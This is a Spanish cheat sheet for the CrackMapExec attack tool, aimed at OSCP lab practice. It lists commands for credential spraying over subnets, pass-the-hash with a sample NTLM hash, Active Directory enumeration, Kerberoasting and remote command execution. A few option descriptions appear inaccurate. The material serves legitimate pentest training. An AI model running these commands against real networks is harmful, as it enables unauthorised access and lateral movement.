CrackMapExec (`cme`) es una herramienta potente de post-explotación y enumeración para entornos Windows/Active Directory. Permite listar usuarios, shares, políticas, identificar sesiones activas y lanzar ataques como Pass-the-Hash o Kerberoasting. En OSCP es clave para moverse lateralmente o escalar privilegios.

---

## Instalación

Recomendado usar pipx:
```bash
pipx install crackmapexec
```

O manualmente:
```bash
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec
pip install -r requirements.txt
python3 setup.py install
```

---

## Uso Básico

```bash
cme smb <IP> -u <usuario> -p <password>
```

Ejemplo:
```bash
cme smb 10.11.1.100 -u admin -p 'password123'
```

---

## Escaneo de Rango

```bash
cme smb 10.11.1.0/24 -u admin -p 'password123'
```

---

## Autenticación con Hash (Pass-the-Hash)

```bash
cme smb <IP> -u administrator -H aad3b435b51404eeaad3b435b51404ee:9a709a4f68c4b9c14d6eb9c4b7643dfc
```

---

## Enumerar Usuarios y Grupos

```bash
cme smb <IP> -u user -p pass --users
cme smb <IP> -u user -p pass --groups
```

---

## Enumerar Shares

```bash
cme smb <IP> -u user -p pass --shares
```

---

## Verificar si un Usuario es Admin Local

```bash
cme smb <IP> -u user -p pass --local-auth
```

---

## Kerberoasting

```bash
cme smb <IP> -u user -p pass --kerberoast
```

Archivos `.kirbi` se guardan localmente para crackear con hashcat.

---

## Módulos Extra (e.g., Mimikatz, WMI, PSExec)

```bash
cme smb <IP> -u user -p pass -x whoami
```

---

## Casos de Uso OSCP

- Verificar credenciales reutilizadas
- Listar recursos accesibles sin privilegios
- Enumerar usuarios para ataques posteriores
- Realizar movimiento lateral en entorno AD

---

## Buenas Prácticas

- Siempre verificar primero si tienes credenciales válidas
- Usar rangos `/24` si no sabes la IP exacta del DC
- Guardar toda salida para referencia posterior (`tee`)

---
